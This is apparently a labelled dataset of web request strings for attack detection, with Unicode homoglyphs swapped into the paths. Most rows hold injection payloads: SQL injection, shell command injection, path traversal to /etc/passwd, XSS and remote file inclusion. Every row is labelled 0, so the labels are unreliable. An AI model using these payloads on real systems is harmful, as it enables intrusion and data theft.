sentences 	 labels
/ 𐑈𝓉ring / modo = insertar & precio = 4935 & b1 = confirmar /  	 0
/ Ꮾѡb70v0b . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ꜱ𝔱ring / strings / parameters = "  |  | echo $ ifsbvgjoe $  (  ( 17 + 25 )  )  $  ( echo $ ifsbvgjoe ) bvgjoe \  	 0
/ 𝒔𝑐ript_path / installation / index . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ?  	 0
/ z𝐚ᖯbix / frontends / php / locales . php ? download = 1 & langto = 1 & extlang [  "  . system (  ' chmod + 777 +  / tmp / gcduwrjgmt . sh '  )  .  "  ]  = 1  	 0
/ 𝓼𝕥ring / strings / parameters = ;  str =  $  ( echo hnlfqm )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 0
/ 𝐬𝖙ring / modo = registro & login = jdavie & password = comba82v72ad & nombre = ram & apellidos = pieres + marrett & email = anutchitcharnchai @ informatica2009 . ec & dni = 76610505n & direccion = juan + martel + 18 ,  + 8 ? h & ciudad = buenavista + del + norte & cpa = 08612 & provincia = guadalajara & ntc = 0010509413049118 & b1 = registrar  	 0
/ 𝓮𝙭amples / jsp / cal / bb-hostsvc . sh ? hostsvc =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ _mⅇm_𝕓in /  .  .  % u00255c .  .  % u00255c / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ mα𝓲n . php ? logout =  ' del \ x09q59958199 \ x09 #  	 0
/ 𝕪𝔢f5f3d5 . php3 ?  < script > document . cookie =  " testcrcv = 6167 ;  "  <  / script >  	 0
/ 𝒄𝑔ibin / windmail . exe ?  -n c :  \ boot . ini hacker @ hax0r . com  |  dir c :  \  \  	 0
/ 𝚎𝔁amples / jsp / jsp2 / el / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝚜𝕥ring / strings / parameters = <  !  foo =  "  >  < script > alert ( 91 )  <  / script >  "  >  	 0
/ 𝗌𝔱ring / modo = registro & login = dunlap & password = d5s3748da & nombre = walerico & apellidos = bartra + berguo & email = luca8 @ mobilecrm . iq & dni = 41944054n & direccion = plaa + don + ramon + serrano + suer ,  + s / n +  & ciudad = antigedad & cp = 09610 & provincia = madrid & ntc = 2664915448366606 & b1 =  '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 0
/ 𝟭գwv2p5p . kspx ?  < meta http-equiv = set-cookie content =  " testvqcy = 252 "  >  	 0
/ 𑣕О6wkcop . aspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝙗l𝘶e ' s /  	 0
/  ᛌ stoked '  gets to the heart of extreme athletics /  	 0
/ ℎ𝖾lp . php ? q =  "  & ver ;  > q51857139 & rem ;  	 0
/ 𝒘𝑒bdav / phprun . php ? cmd = c :  \ wce . exe  	 0
/ 𝙗mꬲun223 . asp ?  < meta http-equiv = set-cookie content =  " testhhwu = 7044 "  >  	 0
/ ѕ𝙩ring / strings / parameters = -3884 "  "  where 8012 = 8012 union all select 8012 , 8012 #  	 0
/ ꜱ𝘵ring / modo = registro & login = tomaszew & password = capillero & nombre = robustiana & apellidos = sabater + espndola & email = leighton @ pedro-muoz . gs & dni = 33035723h & direccion = c /  + transportes + 70 +  & ciudad = brboles & cp =  +  & provincia = palencia & ntc = 6125129848113122 & b1 = registrar  	 0
/ 𝒔𝒕ring / modo = registro & login = yitan & password = barraquer6 & nombre = pirro & apellidos = zurita + santander & email = gisladottir @ ingenieriadelaconstruccion . bh & dni = 96580643d & direccion = c /  + chisperos ,  + s / n ,  + 3-h & ciudad = valdehncar & cpa = 43144 & provincia = burgos & ntc = 6951238720062630 & b1 = registrar  	 0
/ 𝔱o𝕡 . php ? stuff =  ;  	 0
/ ѕ𝘁ring / strings / parameters = -4586 union all select 2068 , 2068 , 2068 , 2068 --  	 0
/ 𝖘𝘁ring / strings / parameters = & echo $ ifshywhuo $  (  ( 82 + 84 )  )  $  ( echo $ ifshywhuo ) hywhuo '  	 0
/ 𝓼ᴄripts / ajax . php ? rs = __exp__getfeedcontent & rsargs [  ]  = -99 union select 1974863202 , 2 , 2009798962 , 4 , 5 , 6 , 7 , 8 , 9 , 0 , 1 , 2 , 3  --  	 0
/ ꜱ𝘵ring / strings / parameters = < xml id = cdcat >  < note >  < to >  & lt ; span style = x : exp <  !  [ cdata [ r ]  ]  > ession ( confirm ( 3 )  )  & gt ; hello & lt ;  / span & gt ;  <  / to >  <  / note >  <  / xml >  < table border =  " 1 "  datasrc =  "  # cdcat "  >  < tr >  < td >  < span datafld =  " to "  dataformatas = html >  <  / span >  <  / td >  <  / tr >  <  / table >  	 0
/ 𝕤𝖙ring / modo = registro & login = gaye & password = kantiana & nombre = fructuoso & apellidos = rodrigo + ambrs & emaila = bloom @ ajuntamentbcn2-0 . sz & dni = 96068417q & direccion = c /  + juan + sebastian + elcano + 178 +  & ciudad = toba & cp = 17741 & provincia = lleida & ntc = 5250839743016206 & b1 = registrar  	 0
/ 𝒸𝗀i / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𐑈𝐭ring / strings / parameters = & echo $ ifstkzmma $  (  ( 70 + 55 )  )  $  ( echo $ ifstkzmma ) tkzmma '  	 0
/ ꜱ𝑡ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo qtrmrj )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ n𝒚j𝘨aorz . dll ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝑟ꬲcordings / store . php ? crn = 42 '  & action = show & show_products_mode = cat_click  	 0
/ 𝐢n𝖽ex . php ? post =  .  .  / config / password  	 0
/ 𝘀𝘁ring / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo hbifjl )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 0
/ m𝘷𝟖wxfy9 . html ?  < script > document . cookie =  " testrhbc = 8184 ;  "  <  / script >  	 0
/ 𝒔𝓽ring / strings / parameters = '  |   [  5 -ne  $  ( echo qptcde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/ 𝗌𝙩ring / strings / parameters = 1 "  "  )  )  )  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  (  (  (  "  " obau "  "  =  "  " obau  	 0
/ 𝔰𝕥ring / strings / parameters = >  "  "  < body onload !  #  $  %  &  (  )  *  ~  + -_ .  ,  :  ;  ?  @  [  /  |  \  \  ]  ^  `  = document . cookie = true ;  >  	 0
/ 𝙨𝘵ring / modo = entrar & login = zaretsky & pwd = 725l479zo & remember =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' % & b1 = entrar  	 0
/ 𐐽𝔤i-bin / cgiwrap /  < font color = red >  	 0
/ 𝙖𝒅min / doeditconfig . php ? thispath =  .  .  / includes & config [ path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  	 0
/ 𝙨𝓽ring / strings / parameters = 1 "  "  )  )  )  ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  	 0
/ 𝕤𝘵ring / strings / parameters = 1 "  "  )  as ybkp where 7788 = 7788 or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  --  	 0
/ 𝑠𝙘gi-bin / pfdisplay . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  '  	 0
/ m𝘢n𝘢ger / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ winnt \ win . ini  	 0
/ с𝑔i-bin / index . php ? search =  '  >  < script > alert (  ' autoindex_search_xss . nasl '  )  ;  <  / script >  & searchmode = f  	 0
/ 𝔰𝓉ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo tpcdnb )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ 𝚜𝘵ring / strings / parameters = 1 '  |  |  ( select  ' irfn '  where 8360 = 8360 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  	 0
/ o𑜆𝕔gi / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / winnt / win . ini  	 0
/ 𝚏o𝟱64rei . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝒔𝖙ring / strings / parameters = 1 '  )  as bfgl where 8959 = 8959 union all select null , null , null , null , null , null , null , null , null , null --  	 0
/ 𝔰𝓽ring / str =  $  ( echo iezshq )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 0
/ ꜱ𝕥ring / strings / parameters = "  | echo $ ifscsecod $  (  ( 94 + 97 )  )  $  ( echo $ ifscsecod ) csecod "  	 0
/ 𝐬𝒕ring / strings / parameters = -1300 )  as rrsm where 1086 = 1086 or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  --  	 0
/ 𝚜𝘵ring / strings / parameters = -5066 '  )  )  union all select 9689 , 9689 , 9689 , 9689 #  	 0
/ 𝗌𝒕ring / strings / parameters = -1076 union all select 3959 , 3959 --  	 0
/ 𝒾n𝑐lude / error / autherror . cfm ? errorcode = 1 & ftvar_linkp =  "  >  <  / a >  < script > alert (  ' fusetalk_mult_xss . nasl '  )  <  / script >  < a href =  "  	 0
/ 𝓎𝖉exw8by . php3 ?  < meta http-equiv = set-cookie content =  " testulex = 4996 "  >  	 0
/ 𝐬𝔱ring / strings / parameters = 1 )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( 3872 = 3872  	 0
/ ѕ𝚝ring / strings / parameters = 1 %  '  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  '  %  '  =  '  	 0
/ 𐑈𝔱ring / strings / parameters = 1 "  "  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  #  	 0
/ 𝓈𝘵ring / strings / parameters = "  ) print (  ` echo adfeoj echo  $  (  ( 67 + 57 )  )  echo adfeoj echo adfeoj `  )  ;  .  ' adfeoj  	 0
/ 𝒆𝔁amples / jsp / jsp2 / jspx / adlayer . php ? layerstyle =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 0
/ ꓒ𝓈lpwt15 . html ?  < meta http-equiv = set-cookie content =  " testtkio = 5454 "  >  	 0
/ 𝗌𝑡ring / str =  $  ( echo mkjxcw )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 0
/  .  .  .  .  .  .  .  .  .  { file }  	 0
/ 𝒔𝒕ring / strings / parameters = < meta charset = iso-2022-jp >  <  ( jd ( ji ( jv >  < i ( jm ( jg s ( jr ( jc ( j =  ( jx o ( jn ( jer ( jr ( jo ( jr ( j =  ( ja ( jl ( je ( jr ( jt ( 1 )  /  /  ( j <  ( j /  ( jd ( jiv ( j >  ( j  	 0
/ j𝒂𝗏ascript /  . htpasswd . sfish /  \  '  \  "  	 0
/ m𝓪ιn . php ? logout =  "  \ x0arm \ x09q43175153 \ x09 #  	 0
/ іn𝒹ex . php ? lang = xxpathxx  	 0
/ 𝕖𝘹amples / jsp / checkbox / index . php ? op = default & date = 200607 '  union select 1 , 1975764141 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  	 0
/ ɑ𑜎stats / awstats . pl ? migrate =  | echo ;  /  .  / tmp / qkzpkuflrb . sh ; echo | awstats916038 . txt  	 0
/ ѕ𝘁ring / strings / parameters = ' echo $ ifsxlgscn $  (  ( 77 + 2 )  )  $  ( echo $ ifsxlgscn ) xlgscn &  	 0
/ 𝑠𝙩ring / strings / parameters = ;  str =  $  ( echo ytwfpg )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  /  	 0
/ 𝗌𝖙ring / strings / parameters = + dir + c :  +  |  	 0
/ m𝖺𝑖n . php ? logout =  "  & rm \ xa0q69712395 & rem \ xa0  	 0
/ ꜱ𝙩ring / modo = registro & login = muchow & password = 715417c94or $ i3 & nombre = alexis & apellidos =  '  + and +  ' 1 '  =  ' 1 & email = chantrawiboon @ elreversotenebroso . th & dni = 01597109n & direccion = calle + mula + 4 ,  +  & ciudad = vallurcanes & cp = 22240 & provincia = girona & ntc = 6339495785199828 & b1 = registrar  	 0
/ 𝘣𝚞t i ' m with the band /  	 0
/ ҽⅹchange /  .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  \ xc0 % 9v .  .  / winnt / system32 / cmd . exe ?  / c + dir + c :  \  +  / og  	 0
/ j𝈒З4qobz . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝘴𝘁ring / strings / parameters = 1 '  )  as gxpb where 7107 = 7107 or exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 6270 = 6270 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  --  	 0
/ 𝖾n-ꞟs / esmozg5d . exe ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝚜𝓉ring / strings / parameters = benchmark ( 1000000000 , md5 ( char ( 116 )  )  )  	 0
/ 𝖊ⅹamples / servlets / servlet / shopaddtocart . asp ? productid =  ' 42  	 0
/ 𝐬𝑡ring / modo = insertar & precio = 9874 & b1 = pasar + por + caja /  	 0
/ 𝗌𝘁ring / strings / parameters = 1 %  '  )  )  and sleep ( 5 )  and  (  (  '  %  '  =  '  	 0
/ 𐑈𝓽ring / strings / parameters = "  |   [  1 -ne  $  ( echo zddhyl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  #  	 0
/ 𝘀𝘁ring / modo = insertar & precio = 4633 & b1 = pasar + por + caja /  	 0
/ 𐑈𝘁ring / str =  $  ( echo nwelwc )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  	 0
/ 𐑈𝚝ring / strings / parameters = ;  str =  $  ( echo vhbjgh )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  \  \  	 0
/ ƽ𝘁ring / strings / parameters = 1 "  "  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  "  " cwwv "  "  like  "  " cwwv  	 0
/ ƽ𝓽ring / strings / parameters = -5322 "  "  union all select 6494 , 6494 , 6494 , 6494 , 6494 , 6494 --  	 0
/ jɑ𝔳ascript / document . as  	 0
/ 𝑠𝚝ring / strings / parameters = < xml onpropertychange xml onpropertychange =  " javascript : javascript : alert ( 1 )  "  >  <  / xml onpropertychange >  	 0
/ 𝔰𝚝ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo atdeso )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  	 0
/ 𝒄on𝒕enido_4 . 8 . 4 / contenido / cronjobs / optimize_database . php ? cfg [ path ]  [ contenido ]  = xxpathxx ?  	 0
/ 𝕤𝙩ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo lvmwxb )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ l𝗶𝖇 / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl  	 0
/ 𝗌𝚝ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo nwayiz )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 0
/ ꜱ𝑡ring / strings / parameters = 1 '  |  |  ( select  ' wyng '  from dual where 2157 = 2157 union all select null , null --  	 0
/ 𝕒𝗐statstotals / awstatstotals . php ? sort =  {  $  { phpinfo (  )  }  }  {  $  { exit (  )  }  }  	 0
/ 𝑡o𝐩 . php ? stuff =  "  & ver \ x0b > q26467745 & rem \ x0b  	 0
/ 𝕤𝘵ring / strings / parameters = 1 '  )  )  )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  (  (  (  ' tzbp '  =  ' tzbp  	 0
/ 𑣁𝙩ring / strings / parameters = -9227 )  where 6723 = 6723 union all select 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 , 6723 --  	 0
/ ꜱ𝖙ring / strings / parameters = 1 )  )  and 9198 = 9198 --  	 0
/ ѕ𝗍ring / strings / parameters = -5130 '  )  )  union all select 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 , 5218 --  	 0
/ j𑢯𝓭rbkil . fts ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ⅽon𝗳ig . php ? path [ docroot ]  =  / etc / passwd \ x00  	 0
/ 𝗱𝟝a5renl . php3 ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 0
/ 𝐬𝓽ring / strings / parameters = 1 '  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  and  ' pziy '  =  ' pziy  	 0
/ հ𝓮lp . php ? q =  " del \ x0bq14893241 & rem \ x0b  	 0
/ 𝕡𝗁pmyadmin / web_store / web_store . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html  	 0
/ 𝓈𝕥ring / strings / parameters = 1 '  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  ' zspf '  =  ' zspf  	 0
/ 𝔰𝔱ring / strings / parameters = | echo twnzdu $  (  ( 10 + 40 )  )  $  ( echo twnzdu ) twnzdu  	 0
/ 𝘱𝑥agj7n7 . nsf ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ ℹnсlude . php ? path = contact . php & contact_email =  \  "  >  & lt ; script & gt ; alert ( document . cookie )  ;  & lt ;  / script & gt ;  	 0
/ ƽ𝚝ring / strings / parameters = < table >  < td background =  "  " javascript : document . cookie = true ;  "  "  >  	 0
/ ୦𝒖75ldxq . fts ?  < script > cross_site_scripting . nasl <  / script >  	 0
/ 𝘀𝚝ring / strings / parameters = | echo $ ifslxluod $  (  ( 68 + 51 )  )  $  ( echo $ ifslxluod ) lxluod  	 0
/ 𝔰𝓽ring / strings / parameters = '   str =  $  ( echo rqfvas )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 0
/ 𝗌𝖙ring / strings / parameters = "   str =  $  ( echo yqomci )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 0
/ 𝐬𝙩ring / strings / parameters = &  & echo wmetwl $  (  ( 1 + 53 )  )  $  ( echo wmetwl ) wmetwl  	 0
/ 𝐚𝕒aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /  .  .  /  { file }  	 0
/ 𝘢ԁmin / tools / utf8conversion / index . php ? path = xxpathxx ?  	 0
/ o𝒘𝓼-bin / fileseek2 . cgi ? foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd & head =  	 0
/ гⅇcordings / index . php ? setlang = gcards_dir_transversal . nasl & lang [ gcards_dir_transversal . nasl ]  [ file ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 0
/ 𝚜𝑡ring / strings / parameters = 1 '  )  )  and 3355 = 6012 and  (  (  ' ofmy '  =  ' ofmy  	 0
/ 𝘴𝒕ring / strings / parameters = 1 '  |  |  ( select  ' ymwf '  where 1229 = 1229 or char ( 68 )  |  | char ( 69 )  |  | char ( 97 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 )  , 0 )  , 5000000000 )  , null )  )  |  |  '  	 0
/ ꭵn𝒅ex . php ? module =  < script > foo <  / script >  	 0
/ ѕ𝚝ring / modo = registro & login = klasky & password = tem . tico & nombre = licia & apellidos = maeso + comello & email = verrell . myral @ cafedeteatro . kh & dni = 33908887xany ?   set-cookie :  + tamper = 1041264011025374727 & direccion = plaza + pedro + marcos ,  + 145 +  & ciudad = guadalupe & cp = 36700 & provincia = cdiz & ntc = 4984450191632548 & b1 = registrar  	 0
/ ѕ𝔱ring / strings / parameters = "  `  '  >  < script >  \ xe2 \ x80 \ x85javascript : alert ( 1 )  <  / script >  	 0
/ ƽ𝚝ring / strings / parameters = < iframe src =  " http :  /  / target "  referrerpolicy =  " no-referrer "  >  	 0
/ 𝗱𝗂gitaleye_path / module . php ? menu = xxpathxx ?  	 0
/ ℯ⤫amples / jsp / jsp2 / el / search . cgi ?  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ windows \ win . ini  	 0
/ 𝖘𝓉ring / strings / parameters = 1 + union + select + 1 , 2 , 3 ;  	 0
/ 𝒽𝟺bi26jd . exe ?  < script > document . cookie =  " testhrzx = 1150 ;  "  <  / script >  	 0
/ 𝖘𝕥ring / strings / parameters = |   [  7 -ne  $  ( echo hdechs  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 0
/  /  <  / p >  < body >  < script / src =  " http :  /  / www . example . com / test ? rnd = q29464737 "  >  <  / script >  < p >  	 0
/ 𝖈l𝕒sses / query . class . php ? basedir = xxpathxx  	 0
/ ƽ𝙩ring / strings / parameters = -9142 %  "  "  )  )  )  or 1570 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  "  "  %  "  "  =  "  "  	 0
/ 𝔰𝚝ring / modo = entrar & login = yezi & pwd = adestra & remember = off /  & b1 = entrar  	 0
/ 𝙨𝓉ring / id = 1 & nombre = jamn '  + ibric- ' o & precio = 100 & cantidad = 97 & b1 = aadir + al + carrito  	 0
/ 𝑠𝗍ring / strings / parameters = -5449 '  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  ' ryvy '  like  ' ryvy  	 0
/ 𝔰𝑡ring / strings / parameters = 1 "  "  )  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  (  "  " snwx "  "  like  "  " snwx  	 0
/ m𝒂n𝙖ger / lib / dbman_filter . inc . php ? lib_path =  / etc / passwd \ x00  	 0
/ 𝕤𝒕ring / modo = registro & login = bobbette & password = v4n0c76 . se & nombre = albere & apellidos = casa + aro-ca & email = mallalieu @ soymuyguapa . ml & dni = 58990935y & direccion = plaa + puerto + rico ,  + 144 +  & ciudad = guadalajara & cp = 21320 & provincia = soria & ntc = 0626053300449217 & b1 = registrar  	 0
/ 𝓼𝗍ring / strings / parameters = 123 /  *  ! or *  / 1 = 1 ;  	 0
/ 𝖼𝗀i-bin / index . php ? id = egyb16sayu '  	 0
/ 𐑈𝖙ring / strings / parameters = < layer src =  "  " http :  /  / vulnerability-lab . com / script . html "  "  >  <  / layer >  	 0
/ 𝙚𝘹amples / jsp / error / index . php ? op = default & date = 200607 '  union select 1 , 1284682657 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1  	 0
/ 𝚜𝒕ring / strings / parameters = |   [  9 -ne  $  ( echo dajiyu  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 0
/ 𝓼𝑡ring / modo = registro & login = gonzaga & password = acontecimiento & nombre = redenta & apellidos = libano + parramon & email = vigran @ maletti . cy & dni = 24320656l & direccion = calle + tagarnina ,  + 120 ,  + 13c & ciudad = tor .  . m * os & cp = 10748 & provincia = castelln & ntc = 6815796601581594 & b1 = registrar  	 0
/ mooꓒlе / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 0c + 20 + ae + 75 + e9 + e2 + f7 + 8b + 73 + 18 + 8d + 45 + 0d + 50 + 6a + 0e + e8 + 18 + 00 + 00 + 00 + 50 + 8d + 45 + 1b +  +  >  > ctdn  	 0
/ 𝒷m𝕖un223 . aspx ?  < meta http-equiv = set-cookie content =  " testhhwu = 7044 "  >  	 0
/ 𝗌𝘵ring / modo = insertar & precio = 898 & b1 = confirmar /  	 0
/ 𝓈𝕥ring / strings / parameters = < image style =  ' filter : url (  " data : image / svg + xml ,  < svg xmlns =  " http :  /  / www . w3 . org / 2000 / svg "  >  < script > parent . alert ( 129 )  <  / script >  <  / svg >  "  )  '  >  	 0
/ 𝒆𝐱amples / jsp / error / showproduct . php ? product = 1 '  	 0
/ 𝗲⤫amples / jsp / jsp2 / jspx / search / search . cgi ? keys =  *  & prc = any & catigory =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc  	 0
/ 𝐬𝓽ring / strings / parameters = '  |  | echo fqfysl $  (  ( 20 + 12 )  )  $  ( echo fqfysl ) fqfysl  	 0
/ 𝓼𝘁ring / strings / parameters = 1 %  '  union all select null , null , null , null , null , null #  	 0
